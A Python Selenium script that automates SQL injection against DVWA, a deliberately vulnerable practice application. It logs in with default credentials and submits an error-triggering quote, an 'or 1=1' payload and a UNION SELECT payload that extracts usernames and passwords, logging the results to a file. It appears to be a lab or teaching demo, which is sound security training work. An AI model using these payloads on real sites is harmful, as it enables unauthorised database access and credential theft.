from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from bs4 import BeautifulSoup
import time

# from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

# binary = FirefoxBinary('path/to/binary')
# driver = webdriver.Firefox(firefox_binary=binary)
def sqlinjection(host):
	timeToSleep=1
	#create a new Firefox session
	driver = webdriver.Firefox()
	#driver.implicitly_wait(30)
	driver.maximize_window()
	 
	# navigate to the application home page
	driver.get(host+"/dvwa/login.php")
	 
	# get the search textbox
	username = driver.find_element_by_name("username")
	password=driver.find_element_by_name("password")

	# enter search keyword and submit
	username.send_keys("admin")
	password.send_keys("password")
	login=driver.find_element_by_name("Login")
	time.sleep(timeToSleep)
	login.click()


	driver.get(host+"/dvwa/vulnerabilities/sqli/")
	inputElement = driver.find_element_by_name("id")

	#demo
	inputElement.send_keys("'")
	time.sleep(timeToSleep)
	inputElement.send_keys(Keys.ENTER)
	time.sleep(1)

	# creating a log file 
	fp = open('sqloutput.log','w')

	soup = BeautifulSoup(driver.page_source, "lxml")
	page = soup.find('pre').getText()
	text = "\n\noutput of sql query which displays error in sql syntax\n\n"
	fp.write(text)
	fp.write(page)
	time.sleep(2)


	driver.get(host+"/dvwa/vulnerabilities/sqli/")
	inputElement = driver.find_element_by_name("id")
	time.sleep(2)
	inputElement.send_keys("1 &' or 1=1#")
	time.sleep(2)
	inputElement.send_keys(Keys.ENTER)
	time.sleep(2)

	elem = driver.find_elements_by_css_selector('pre')
	text = "\n\n output of sql query to retrive admin name details\n\n"
	fp.write(text)
	for el in elem:
	    fp.write(el.text)



	driver.get(host+"/dvwa/vulnerabilities/sqli/")
	inputElement = driver.find_element_by_name("id")
	time.sleep(2)
	inputElement.send_keys("%' AND 1=0 UNION SELECT user,password FROM users #")
	time.sleep(2)
	inputElement.send_keys(Keys.ENTER)
	time.sleep(2)

	elem = driver.find_elements_by_css_selector('pre')
	text = "\n\n output of sql query to retrive admin and password information\n\n"
	fp.write(text)
	for el in elem:
	    fp.write(el.text)

	text = "\n\n ------- END of command sql injection log file -----------------\n\n"
	fp.write(text)
	fp.close()
	time.sleep(3)
	driver.close()

 
